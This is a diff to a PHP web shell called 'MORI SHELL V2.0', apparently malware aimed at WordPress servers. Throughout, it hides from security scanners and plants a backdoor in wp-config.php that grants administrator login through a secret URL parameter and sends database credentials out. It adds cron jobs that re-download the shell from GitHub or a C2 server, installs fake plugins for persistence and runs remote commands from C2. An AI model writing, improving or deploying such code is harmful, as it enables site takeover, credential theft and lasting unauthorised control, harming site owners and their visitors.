@@ -1,4 +1,28 @@
 <?php
+
+// ─── PHP 5.6 / 7.x / 8.x Compatibility Polyfills ───────────────────────────
+if (!function_exists('str_contains')) {
+    function str_contains($haystack, $needle) {
+        return $needle === '' || strpos($haystack, $needle) !== false;
+    }
+}
+if (!function_exists('str_starts_with')) {
+    function str_starts_with($haystack, $needle) {
+        return $needle === '' || strncmp($haystack, $needle, strlen($needle)) === 0;
+    }
+}
+if (!function_exists('str_ends_with')) {
+    function str_ends_with($haystack, $needle) {
+        return $needle === '' || substr($haystack, -strlen($needle)) === $needle;
+    }
+}
+if (!function_exists('array_is_list')) {
+    function array_is_list($arr) {
+        if (!is_array($arr) || empty($arr)) return true;
+        return array_keys($arr) === range(0, count($arr) - 1);
+    }
+}
+// ─────────────────────────────────────────────────────────────────────────────
 /**
  * MORI SHELL V2.0 - LINUX CLIENT
  * WordPress-aware | Process masking | C2 integrated
@@ -22,15 +46,16 @@ if ((!defined('PHP_OS_FAMILY') || PHP_OS_FAMILY !== 'Linux') &&
     if (php_sapi_name() !== 'cli') exit;
 }
 
-define('SHELL_FILE', basename(__FILE__));
-define('SHELL_PATH', __DIR__ . '/' . SHELL_FILE);
+define('SHELL_FILE', defined('MORI_REAL_FILE') ? basename(MORI_REAL_FILE) : basename(__FILE__));
+define('SHELL_PATH', defined('MORI_REAL_FILE') ? MORI_REAL_FILE : (__DIR__ . '/' . SHELL_FILE));
+define('REAL_DIR',   defined('MORI_REAL_DIR')  ? MORI_REAL_DIR  : __DIR__);
 define('SHELL_VERSION', '2.0-linux');
 
 // =====================================================
 // BOT / SCANNER CLOAKING
 // =====================================================
 function is_bot_request() {
-    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $ua = strtolower((isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''));
     return (bool)preg_match(
         '/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|twitterbot|' .
         'wordfence|sucuri|sitecheck|imunify|modsecurity|virustotal|urlscan|safebrowsing|phishtank|' .
@@ -61,6 +86,7 @@ $persistence_default_url = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/he
 // =====================================================
 function log_error_to_file($message) {
     $log_file = sys_get_temp_dir() . '/.svc_' . substr(md5(__FILE__), 0, 8) . '.log';
+    if (@filesize($log_file) > 512000) @file_put_contents($log_file, '');  // 512KB cap, rotate
     @file_put_contents($log_file, '[' . date('H:i:s') . '] ' . $message . "\n", FILE_APPEND);
 }
 
@@ -110,83 +136,100 @@ function get_wordpress_config() {
 
 function inject_wordpress_persistence($shell_url, $c2_server) {
     $wp_config = null;
-    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
-    
+    $search_dirs = [REAL_DIR, dirname(REAL_DIR), dirname(dirname(REAL_DIR)), dirname(dirname(dirname(REAL_DIR)))];
+
     foreach ($search_dirs as $dir) {
         if (@file_exists($dir . '/wp-config.php')) {
             $wp_config = $dir . '/wp-config.php';
             break;
         }
     }
-    
+
     if (!$wp_config) return false;
-    
+
     $content = @file_get_contents($wp_config);
-    if (!$content || strpos($content, 'mori_backdoor_wp') !== false) return false;
-    
-    // Extract DB credentials from wp-config
+    if (!$content) return false;
+
+    // Already correctly injected (both function + hook block at bottom present)?
+    if (strpos($content, 'mori_backdoor_wp') !== false
+        && strpos($content, 'function_exists(\'add_action\') && function_exists(\'mori_backdoor_wp\')') !== false) {
+        return false;
+    }
+
+    // If old broken injection (add_action inside if block) — strip it, re-inject cleanly
+    if (strpos($content, 'mori_backdoor_wp') !== false) {
+        $content = preg_replace(
+            '/\n\/\/ MORI BACKDOOR.*?^}\n/ms',
+            '',
+            $content
+        );
+        $content = preg_replace(
+            '/\nif \(function_exists\(\'add_action\'\) && function_exists\(\'mori_backdoor_wp\'\)\).*?\}\n/ms',
+            '',
+            $content
+        );
+    }
+
+    // Extract DB credentials
     $db_name = $db_user = $db_pass = $db_host = '';
     preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_name = $m[1];
     preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_user = $m[1];
     preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_pass = $m[1];
     preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_host = $m[1];
-    
-    // Get dynamic WordPress login credentials
+
     $wp_creds = generate_wp_login_credentials();
     $blogs_id = $wp_creds['blogs_id'];
-    $hash = $wp_creds['hash'];
-    
-    $creds_json = json_encode(['db_name' => $db_name, 'db_user' => $db_user, 'db_pass' => $db_pass, 'db_host' => $db_host, 'shell_url' => $shell_url], JSON_UNESCAPED_SLASHES);
+    $hash     = $wp_creds['hash'];
+
+    $creds_json    = json_encode(['db_name' => $db_name, 'db_user' => $db_user, 'db_pass' => $db_pass, 'db_host' => $db_host, 'shell_url' => $shell_url], JSON_UNESCAPED_SLASHES);
     $creds_encoded = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($creds_json));
-    
-    $inject = "\n// MORI BACKDOOR (mori_backdoor_wp) - Generated: " . date('Y-m-d H:i:s') . "\n// MORI ID: " . $blogs_id . "\nif (!function_exists('mori_backdoor_wp')) {\n" .
-        "    function mori_backdoor_wp() {\n" .
-        "        // PARAMETER-BASED HIDDEN LOGIN (blogs_id, wp_login)\n" .
-        "        if (isset(\$_GET['blogs_id']) && isset(\$_GET['wp_login'])) {\n" .
-        "            \$hash = sha1(md5(\$_GET['blogs_id'] . '1776051848'));\n" .
-        "            if (\$hash === '" . $hash . "') {\n" .
-        "                \$users = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC', 'number' => 1]);\n" .
-        "                if (!empty(\$users)) {\n" .
-        "                    \$user = \$users[0];\n" .
-        "                    wp_set_auth_cookie(\$user->ID, true);\n" .
-        "                    wp_redirect(admin_url());\n" .
-        "                    exit;\n" .
-        "                }\n" .
-        "            }\n" .
-        "        }\n" .
-        "        // CREDS EXFIL on admin login\n" .
-        "        if (isset(\$_GET['wp_login'])) {\n" .
-        "            \$shell_url = '" . addslashes($shell_url) . "';\n" .
-        "            \$creds = '" . addslashes($creds_encoded) . "';\n" .
-        "            @wp_remote_post(\$shell_url . '?act=wp_creds', ['body' => ['creds' => \$creds]]);\n" .
-        "        }\n" .
-        "        // AUTO RESTORE\n" .
-        "        if (function_exists('curl_init')) {\n" .
-        "            \$ch = curl_init('" . addslashes($shell_url) . "');\n" .
-        "            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n" .
-        "            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n" .
-        "            curl_setopt(\$ch, CURLOPT_TIMEOUT_MS, 200);\n" .
-        "            @curl_exec(\$ch);\n" .
-        "            curl_close(\$ch);\n" .
-        "        }\n" .
-        "    }\n" .
-        "    add_action('wp_footer', 'mori_backdoor_wp', -999);\n" .
-        "    add_action('wp_authenticate', 'mori_backdoor_wp', -999);\n" .
-        "}\n";
-    
-    $insertion = "/* That's all, stop editing!";
-    if (strpos($content, $insertion) !== false) {
-        $new_content = str_replace($insertion, $inject . $insertion, $content);
+
+    // ── Part 1: function definition (no add_action — WP not loaded yet) ─────────
+    $inject_fn = "\n// MORI BACKDOOR (mori_backdoor_wp) - Generated: " . date('Y-m-d H:i:s') . "\n"
+        . "// MORI ID: " . $blogs_id . "\n"
+        . "if (!function_exists('mori_backdoor_wp')) {\n"
+        . "    function mori_backdoor_wp() {\n"
+        . "        if (isset(\$_GET['blogs_id']) && isset(\$_GET['wp_login'])) {\n"
+        . "            \$_h = sha1(md5(\$_GET['blogs_id'] . '1776051848'));\n"
+        . "            if (\$_h === '" . $hash . "') {\n"
+        . "                \$_u = get_users(['role'=>'administrator','orderby'=>'ID','order'=>'ASC','number'=>1]);\n"
+        . "                if (!empty(\$_u)) { wp_set_auth_cookie(\$_u[0]->ID, true, true); wp_redirect(admin_url()); exit; }\n"
+        . "            }\n"
+        . "        }\n"
+        . "        if (isset(\$_GET['wp_login'])) {\n"
+        . "            \$_su = '" . addslashes($shell_url) . "';\n"
+        . "            \$_cr = '" . addslashes($creds_encoded) . "';\n"
+        . "            @wp_remote_post(\$_su . '?act=wp_creds', ['body' => ['creds' => \$_cr], 'timeout' => 2, 'blocking' => false]);\n"
+        . "        }\n"
+        . "        if (function_exists('curl_init')) {\n"
+        . "            \$_ch = curl_init('" . addslashes($shell_url) . "');\n"
+        . "            curl_setopt(\$_ch, CURLOPT_RETURNTRANSFER, true); curl_setopt(\$_ch, CURLOPT_SSL_VERIFYPEER, false);\n"
+        . "            curl_setopt(\$_ch, CURLOPT_TIMEOUT_MS, 200); @curl_exec(\$_ch); curl_close(\$_ch);\n"
+        . "        }\n"
+        . "    }\n"
+        . "}\n";
+
+    // ── Part 2: hook registration (appended at file end, after wp-settings.php) ─
+    $inject_hooks = "\nif (function_exists('add_action') && function_exists('mori_backdoor_wp')) {\n"
+        . "    add_action('wp_footer',      'mori_backdoor_wp', -999);\n"
+        . "    add_action('wp_authenticate', 'mori_backdoor_wp', -999);\n"
+        . "    add_action('login_init',      'mori_backdoor_wp', -999);\n"
+        . "}\n";
+
+    // Insert function definition before the stop-editing marker
+    $marker = "/* That's all, stop editing!";
+    if (strpos($content, $marker) !== false) {
+        $new_content = str_replace($marker, $inject_fn . $marker, $content);
     } else {
-        // Fallback: marker absent (custom WP or non-standard install)
-        // Fallback: append before closing PHP tag or at EOF
         $trimmed = rtrim($content);
-        if (substr($trimmed, -2) === '?>') {
-            $new_content = substr($trimmed, 0, -2) . "\n" . $inject . "\n?>";
-        } else {
-            $new_content = $trimmed . "\n" . $inject;
-        }
+        $new_content = (substr($trimmed, -2) === '?>')
+            ? substr($trimmed, 0, -2) . "\n" . $inject_fn . "\n?>"
+            : $trimmed . "\n" . $inject_fn;
     }
+
+    // Append hook registration at the very end of wp-config.php (after require wp-settings.php)
+    $new_content = rtrim($new_content) . "\n" . $inject_hooks;
+
     @file_put_contents($wp_config, $new_content);
     return ['blogs_id' => $blogs_id, 'hash' => $hash];
 }
@@ -212,8 +255,8 @@ function detect_web_shell_url() {
     $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
              (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
     $protocol = $https ? 'https://' : 'http://';
-    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-    $script = $_SERVER['SCRIPT_NAME'] ?? '/';
+    $host = (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost'));
+    $script = (isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/');
     return $protocol . $host . $script;
 }
 
@@ -233,29 +276,44 @@ function install_cron_persistence() {
     $shell     = SHELL_PATH;
     $c2        = $GLOBALS['C2_SERVER'];
     $token     = md5('mori_c2_secret_2024_persistence');
-    $gh_url    = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php';
-    // Restore only when file is actually gone — C2 first (4s), GitHub fallback
+    $gh_url    = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';
+    // Restore only when file is actually gone — GitHub FIRST (C2 may have UAM active)
     // head -c5 check: reject Cloudflare UAM HTML pages (they return 200 but aren't PHP)
-    $c2_fetch  = "curl -sfL --max-time 4 '" . $c2 . "?act=get_shell&token=" . $token . "' -o '" . $shell . ".tmp' 2>/dev/null"
-               . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
-               . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
     $gh_fetch  = "curl -sfL --max-time 15 '" . $gh_url . "' -o '" . $shell . ".tmp' 2>/dev/null"
                . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
                . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
-    $restore_cmd = "[ -f '" . $shell . "' ] || { " . $c2_fetch . " || " . $gh_fetch . "; } >/dev/null 2>&1";
-    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; " . $restore_cmd;
+    $c2_fetch  = "curl -sfL --max-time 4 '" . $c2 . "?act=get_shell&token=" . $token . "' -o '" . $shell . ".tmp' 2>/dev/null"
+               . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
+               . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
+    $restore_cmd = "[ -f '" . $shell . "' ] || { " . $gh_fetch . " || " . $c2_fetch . "; } >/dev/null 2>&1";
+    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; " . $restore_cmd . " #mori_persist";
 
-    // Method 1: exec_any (shell_exec→exec→system→passthru→proc_open→popen)
-    $cron_cmd = "(crontab -l 2>/dev/null | grep -v mori; echo '$script') | crontab - 2>/dev/null";
+    // Method 1: exec_any — strip ALL #mori_persist lines (any shell path) then add fresh entry
+    $cron_cmd = "(crontab -l 2>/dev/null | grep -vF '#mori_persist'; echo '$script') | crontab - 2>/dev/null";
     if (exec_any($cron_cmd) !== false) return true;
 
-    // Method 2: proc_open stdin (no shell required)
+    // Method 2: proc_open stdin — read existing crontab, strip #mori_persist, append fresh entry
     $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
     if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
+        // Read current crontab
+        $existing_cron = '';
+        $rd = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+        $rp = @proc_open('crontab -l 2>/dev/null', $rd, $rp_pipes);
+        if (is_resource($rp)) {
+            $existing_cron = stream_get_contents($rp_pipes[1]);
+            fclose($rp_pipes[1]); fclose($rp_pipes[2]);
+            proc_close($rp);
+        }
+        // Strip all existing #mori_persist lines
+        $lines = array_filter(explode("\n", $existing_cron), function($l) {
+            return strpos($l, '#mori_persist') === false && trim($l) !== '';
+        });
+        $new_cron = implode("\n", $lines) . "\n" . $script . "\n";
+        // Write back
         $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
         $proc = @proc_open('crontab -', $descriptors, $pipes);
         if (is_resource($proc)) {
-            fwrite($pipes[0], $script . "\n");
+            fwrite($pipes[0], $new_cron);
             fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
             proc_close($proc);
             return true;
@@ -264,8 +322,11 @@ function install_cron_persistence() {
 
     // Method 3: /etc/cron.d/ direct write
     if (@is_writable('/etc/cron.d/')) {
-        @file_put_contents('/etc/cron.d/mori-shell', $script . "\n", FILE_APPEND);
-        @chmod('/etc/cron.d/mori-shell', 0644);
+        $existing = @file_get_contents('/etc/cron.d/mori-shell');
+        if (!$existing || strpos($existing, '#mori_persist') === false) {
+            @file_put_contents('/etc/cron.d/mori-shell', $script . "\n");
+            @chmod('/etc/cron.d/mori-shell', 0644);
+        }
         return true;
     }
 
@@ -282,7 +343,7 @@ function install_wp_persistence() {
 function install_wp_plugin_persistence() {
     // wp-config.php'yi bul → plugins dizinini türet
     $wp_root = null;
-    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
+    foreach ([REAL_DIR, dirname(REAL_DIR), dirname(dirname(REAL_DIR)), dirname(dirname(dirname(REAL_DIR)))] as $d) {
         if (@file_exists($d . '/wp-config.php') || @file_exists($d . '/wp-load.php')) {
             $wp_root = $d; break;
         }
@@ -295,20 +356,28 @@ function install_wp_plugin_persistence() {
     $plugin_dir  = $plugins_dir . '/fastest-cache-2';
     $plugin_file = $plugin_dir  . '/fastest-cache-2.php';
 
-    // Dosya sağlıklıysa günde bir kez kontrol yap (hızlı dön)
+    // Dosya sağlıklıysa günde bir kez kontrol yap — ama FC2_SHELL yanlışsa yeniden oluştur
     if (@file_exists($plugin_file) && @filesize($plugin_file) > 500) {
-        $ts_file = sys_get_temp_dir() . '/.mori_plugin_ts';
-        if ((int)@file_get_contents($ts_file) > time() - 86400) return;
-        @file_put_contents($ts_file, time()); return;
+        $existing = @file_get_contents($plugin_file);
+        $shell_ok = false;
+        if ($existing && preg_match('/define\("FC2_SHELL",\s*"([^"]+)"\)/', $existing, $pm)) {
+            $shell_ok = ($pm[1] === SHELL_PATH);
+        }
+        if ($shell_ok) {
+            $ts_file = sys_get_temp_dir() . '/.mori_plugin_ts';
+            if ((int)@file_get_contents($ts_file) > time() - 86400) return;
+            @file_put_contents($ts_file, time()); return;
+        }
+        // FC2_SHELL path mismatch → regenerate immediately
     }
     // Plugin eksik/bozuk → throttle'sız anında yeniden oluştur
 
     @mkdir($plugin_dir, 0755, true);
 
-    $shell_path = addslashes(__FILE__);
-    $shell_url  = addslashes($GLOBALS['WEB_URL']  ?? '');
-    $c2_url     = addslashes($GLOBALS['C2_SERVER'] ?? '');
-    $gh_url     = addslashes('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php');
+    $shell_path = addslashes(SHELL_PATH);
+    $shell_url  = addslashes((isset($GLOBALS['WEB_URL']) ? $GLOBALS['WEB_URL'] : ''));
+    $c2_url     = addslashes((isset($GLOBALS['C2_SERVER']) ? $GLOBALS['C2_SERVER'] : ''));
+    $gh_url     = addslashes('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php');
     $fc2_token  = md5('mori_c2_secret_2024_persistence');
 
     $plugin_code = '<?php
@@ -401,7 +470,7 @@ add_action("wp_ajax_fc2_ping",        "fc2_ping_handler");
                 preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m4);
                 preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $cfg, $m5);
                 if ($m1 && $m2 && $m3 && $m4) {
-                    $prefix = $m5[1] ?? 'wp_';
+                    $prefix = (isset($m5[1]) ? $m5[1] : 'wp_');
                     try {
                         $db = new PDO("mysql:host={$m4[1]};dbname={$m1[1]};charset=utf8", $m2[1], $m3[1],
                             [PDO::ATTR_TIMEOUT=>3, PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT]);
@@ -445,9 +514,9 @@ function install_mu_plugin_persistence() {
     }
     // MU plugin eksik/bozuk → throttle'sız yeniden oluştur
 
-    $shell_path = addslashes(__FILE__);
-    $c2_url     = addslashes($GLOBALS['C2_SERVER'] ?? '');
-    $gh_url     = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php';
+    $shell_path = addslashes(SHELL_PATH);
+    $c2_url     = addslashes((isset($GLOBALS['C2_SERVER']) ? $GLOBALS['C2_SERVER'] : ''));
+    $gh_url     = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';
     $mu_token   = md5('mori_c2_secret_2024_persistence');
 
     $mu_code = '<?php
@@ -503,28 +572,34 @@ add_action("init", function() {
     @file_put_contents(sys_get_temp_dir() . '/.mori_mu_ts', time());
 }
 
+// CLIENT_ID must be set BEFORE persistence calls so report_sister_files_to_c2() has a valid ID
+$CLIENT_ID = generate_client_id();
+$GLOBALS['C2_SHELL'] = SHELL_PATH;
+
+// Fast file-write persistence — no blocking I/O, safe to run before HTTP response
 @install_wp_persistence();
 @install_wp_plugin_persistence();
 @install_mu_plugin_persistence();
-@install_cron_persistence();
-@ensure_persistence_v4();  // starts Python+bash monitors on first request (5-min throttle)
+// NOTE: install_cron_persistence() and ensure_persistence_v4() are heavy (crontab, directory scan,
+// background monitors). They are called AFTER the HTTP response is sent in each request handler,
+// so they never delay the response to C2/multi.py. See pull_register and ?info handlers below.
 
 // =====================================================
 // CLIENT ID & SYSTEM INFO
 // =====================================================
 
 function generate_client_id() {
-    $id_file = __DIR__ . '/.mori_id';
+    $id_file = REAL_DIR . '/.mori_id';
     if (@file_exists($id_file) && filesize($id_file) > 5) {
         return trim(file_get_contents($id_file));
     }
-    $id = 'mori_' . substr(md5(php_uname() . __FILE__), 0, 16);
+    $id = 'mori_' . substr(md5(php_uname() . SHELL_PATH), 0, 16);
     @file_put_contents($id_file, $id);
     return $id;
 }
 
 function generate_wp_login_credentials() {
-    $creds_file = __DIR__ . '/.wp_login_creds';
+    $creds_file = REAL_DIR . '/.wp_login_creds';
     $secret = '1776051848';
 
     // 1. Try cached creds file
@@ -536,7 +611,7 @@ function generate_wp_login_credentials() {
     }
 
     // 2. .wp_login_creds missing/corrupt — try to recover blogs_id from wp-config.php
-    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
+    $search_dirs = [REAL_DIR, dirname(REAL_DIR), dirname(dirname(REAL_DIR)), dirname(dirname(dirname(REAL_DIR)))];
     foreach ($search_dirs as $dir) {
         $cfg = $dir . '/wp-config.php';
         if (!@file_exists($cfg)) continue;
@@ -559,9 +634,6 @@ function generate_wp_login_credentials() {
     @file_put_contents($creds_file, json_encode($creds));
     return $creds;
 }
-
-$CLIENT_ID = generate_client_id();
-$GLOBALS['C2_SHELL'] = __FILE__;
 
 function get_system_info() {
     return [
@@ -633,7 +705,7 @@ function http_request($method, $url, $data = null) {
     
     $host = $parts['host'];
     $port = ($parts['scheme'] === 'https') ? 443 : 80;
-    $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
+    $path = ((isset($parts['path']) ? $parts['path'] : '/')) . (isset($parts['query']) ? '?' . $parts['query'] : '');
     
     $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
     if ($fp) {
@@ -666,7 +738,7 @@ function http_request($method, $url, $data = null) {
 // =====================================================
 function exec_any($cmd, $bg = false) {
     $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
-    $run = $bg ? ($cmd . ' > /dev/null 2>&1 &') : ($cmd . ' 2>&1');
+    $run = $bg ? ('(setsid ' . $cmd . ' </dev/null >/dev/null 2>&1 &)') : ($cmd . ' 2>&1');
 
     foreach (['shell_exec','exec','system','passthru'] as $fn) {
         if (function_exists($fn) && !in_array($fn, $disabled)) {
@@ -748,7 +820,7 @@ if (!isset($GLOBALS['_SHELL_REGISTERED'])) {
 // Handle API requests
 if (isset($_GET['m']) || isset($_POST['m'])) {
     // Decode with safe_base64_decode (uses -, _ instead of +, /)
-    $encoded = $_GET['m'] ?? $_POST['m'] ?? '';
+    $encoded = (isset($_GET['m']) ? $_GET['m'] : (isset($_POST['m']) ? $_POST['m'] : ''));
     $cmd = safe_base64_decode($encoded);
     
     if (!$cmd) {
@@ -756,10 +828,10 @@ if (isset($_GET['m']) || isset($_POST['m'])) {
         exit;
     }
     
-    error_log("[EXEC] Executing command: " . (strlen($cmd ?? '') > 0 ? substr($cmd, 0, 100) : '(empty)'));
+    error_log("[EXEC] Executing command: " . (strlen((isset($cmd) ? $cmd : '')) > 0 ? substr($cmd, 0, 100) : '(empty)'));
     
     $output = execute_command($cmd);
-    $task_id = $_GET['task_id'] ?? $_POST['task_id'] ?? null;
+    $task_id = (isset($_GET['task_id']) ? $_GET['task_id'] : (isset($_POST['task_id']) ? $_POST['task_id'] : null));
     
     error_log("[EXEC] Output length: " . strlen($output));
     
@@ -772,7 +844,17 @@ if (isset($_GET['m']) || isset($_POST['m'])) {
 }
 
 if (isset($_GET['info'])) {
-    echo json_encode(get_system_info());
+    $info_resp = json_encode(get_system_info());
+    header('Content-Type: application/json; charset=utf-8');
+    header('Content-Length: ' . strlen($info_resp));
+    header('Connection: close');
+    echo $info_resp;
+    // HTTP bağlantısını kapat — persistence response'u geciktirmemeli
+    if (function_exists('fastcgi_finish_request')) fastcgi_finish_request();
+    else { @ob_end_flush(); @flush(); }
+    ignore_user_abort(true);
+    @install_cron_persistence();
+    @ensure_persistence_v4();
     exit;
 }
 
@@ -785,8 +867,8 @@ if (isset($_GET['info'])) {
 if (isset($_POST['act']) && $_POST['act'] == 'upload_file') {
     header('Content-Type: application/json; charset=utf-8');
     
-    $encoded_data = $_POST['data'] ?? '';
-    $filename = $_POST['filename'] ?? '';
+    $encoded_data = (isset($_POST['data']) ? $_POST['data'] : '');
+    $filename = (isset($_POST['filename']) ? $_POST['filename'] : '');
     
     // Validate
     if (empty($encoded_data) || empty($filename)) {
@@ -874,7 +956,7 @@ if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
     foreach ($backup_paths as $path) {
         if (@is_dir($path) && @is_writable($path)) {
             // Look for shell backups in this directory
-            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
+            $shell_name = basename((isset($GLOBALS['C2_SHELL']) ? $GLOBALS['C2_SHELL'] : __FILE__));
             $pattern = $path . '/*' . $shell_name;
             $matches = @glob($pattern, GLOB_NOSORT);
             if ($matches && count($matches) > 0) {
@@ -890,8 +972,8 @@ if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
     // Check for cron job
     if (function_exists('shell_exec')) {
         $crontab = @shell_exec('crontab -l 2>/dev/null');
-        if ($crontab && (strpos($crontab, $GLOBALS['CLIENT_ID'] ?? 'mori') !== false || 
-                         strpos($crontab, basename($GLOBALS['C2_SHELL'] ?? __FILE__)) !== false)) {
+        if ($crontab && (strpos($crontab, (isset($GLOBALS['CLIENT_ID']) ? $GLOBALS['CLIENT_ID'] : 'mori')) !== false || 
+                         strpos($crontab, basename((isset($GLOBALS['C2_SHELL']) ? $GLOBALS['C2_SHELL'] : __FILE__))) !== false)) {
             $persistence_info['cron_job'] = true;
         }
     }
@@ -906,8 +988,8 @@ if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
     if (function_exists('shell_exec')) {
         $ps = @shell_exec('ps aux 2>/dev/null');
         if ($ps) {
-            $client_id = $GLOBALS['CLIENT_ID'] ?? 'mori';
-            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
+            $client_id = (isset($GLOBALS['CLIENT_ID']) ? $GLOBALS['CLIENT_ID'] : 'mori');
+            $shell_name = basename((isset($GLOBALS['C2_SHELL']) ? $GLOBALS['C2_SHELL'] : __FILE__));
             foreach (explode("\n", $ps) as $line) {
                 if ((strpos($line, $client_id) !== false || strpos($line, $shell_name) !== false) && 
                     strpos($line, 'grep') === false) {
@@ -927,7 +1009,8 @@ if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
     exit;
 }
 if (isset($_GET['task'])) {
-    echo @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']) ?: "[WAIT]";
+    $task_data = @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
+    echo is_array($task_data) ? json_encode($task_data) : ($task_data ?: "[WAIT]");
     exit;
 }
 
@@ -947,12 +1030,12 @@ if (php_sapi_name() === 'cli') {
     @ProcessMasker::mask();
 
     // Queue dosyasını işle (web PHP'de exec kısıtlıysa CLI burada çalışır)
-    $queue_file = __DIR__ . '/.mori_exec_queue';
+    $queue_file = REAL_DIR . '/.mori_exec_queue';
     if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
         $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
         @file_put_contents($queue_file, '[]', LOCK_EX); // Temizle
         foreach ($queue as $item) {
-            $qcmd = $item['cmd'] ?? '';
+            $qcmd = (isset($item['cmd']) ? $item['cmd'] : '');
             if (!empty($qcmd)) {
                 $qout = execute_system_command($qcmd);
                 @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE_EXEC] " . $qout, null);
@@ -974,15 +1057,22 @@ if (php_sapi_name() === 'cli') {
         $retry_after  = null;
 
         if ($task_raw) {
-            $task_decoded = @json_decode($task_raw, true);
+            if (is_string($task_raw)) {
+                $task_decoded = @json_decode($task_raw, true);
+            } elseif (is_array($task_raw)) {
+                $task_decoded = $task_raw;
+            } else {
+                $task_decoded = null;
+            }
+
             if (is_array($task_decoded)) {
                 $retry_after = isset($task_decoded['retry_after']) ? (int)$task_decoded['retry_after'] : null;
-                $raw_cmd     = $task_decoded['command'] ?? '';
+                $raw_cmd     = (isset($task_decoded['command']) ? $task_decoded['command'] : '');
                 if ($raw_cmd && !in_array($raw_cmd, $error_sentinels, true)) {
                     $cmd     = $raw_cmd;
-                    $task_id = $task_decoded['id'] ?? null;
+                    $task_id = (isset($task_decoded['id']) ? $task_decoded['id'] : null);
                 }
-            } elseif (!in_array($task_raw, $error_sentinels, true)) {
+            } elseif (is_string($task_raw) && !in_array($task_raw, $error_sentinels, true)) {
                 $cmd = $task_raw;
             }
         }
@@ -991,12 +1081,12 @@ if (php_sapi_name() === 'cli') {
             $out = execute_command($cmd);
             @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $out, $task_id);
             $idle_streak  = 0;
-            $next_poll_in = $retry_after ?? 5; // task just ran → check again soon
+            $next_poll_in = (isset($retry_after) ? $retry_after : 5); // task just ran → check again soon
         } else {
             $idle_streak++;
             // Exponential backoff: 30s → 60s after 10 idle polls
             $backoff      = $idle_streak > 10 ? 60 : 30;
-            $next_poll_in = $retry_after ?? $backoff;
+            $next_poll_in = (isset($retry_after) ? $retry_after : $backoff);
         }
 
         // Process local exec queue each cycle
@@ -1004,7 +1094,7 @@ if (php_sapi_name() === 'cli') {
             $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
             @file_put_contents($queue_file, '[]', LOCK_EX);
             foreach ($queue as $item) {
